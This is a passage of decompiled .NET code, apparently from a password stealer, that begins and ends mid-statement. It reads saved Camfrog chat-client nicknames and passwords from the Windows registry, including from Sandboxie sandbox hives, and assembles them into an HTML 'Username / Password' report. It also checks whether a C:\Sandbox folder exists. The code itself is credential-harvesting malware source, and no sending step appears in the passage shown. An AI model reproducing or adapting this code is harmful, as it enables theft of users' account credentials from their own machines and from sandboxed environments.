((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "63", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "64", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "66", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "67", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "69", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "70", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "72", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "73", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "75", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "76", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "78", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "79", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "81", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "82", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "84", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "85", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "87", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "88", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "90", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "91", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "93", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "94", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "96", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "97", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "99", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "100", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "102", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "103", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "105", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "106", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "108", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "109", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "111", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "112", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "114", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "115", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "117", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "118", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "120", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "121", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "123", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "124", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "126", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "127", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "129", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "130", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "132", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "133", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "135", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "136", (object)"")), (object)"</td>"))));
						goto IL_1c48;
						IL_1c48:
						num = 65;
						directoryInfo2 = new DirectoryInfo("C:\\Sandbox");
						goto IL_1c58;
						IL_1c58:
						num = 66;
						if (directoryInfo2.get_Exists())
						{
							goto IL_1c68;
						}
						goto IL_2e17;
						IL_1c68:
						num = 67;
						val3 = val2;
						val3.set_Text(Conversions.ToString(Operators.AddObject((object)val3.get_Text(), Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"<table><tr bgcolor=#D8D8D8><td><FONT face=Verdana color=#000000 size=1><b>Sandboxie Nicknames:</td></tr></table><table cellpadding=\"2\" cellspacing=\"2\" width=%\"><tr><td bgcolor=\"#cccccc\"><b>Username</b></td><td bgcolor=\"#cccccc\"><b>Password</b></td></tr><tr>", Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "0", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "1", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "3", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "4", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "6", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "7", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "9", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "10", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "12", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "13", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "15", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "16", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "18", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "19", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "21", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "22", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "24", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "25", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "27", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "28", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "30", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "31", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "33", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "34", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "36", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "37", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "39", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "40", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "42", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "43", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "45", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "46", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "48", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "49", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "51", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "52", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "54", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "55", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "57", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "58", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", 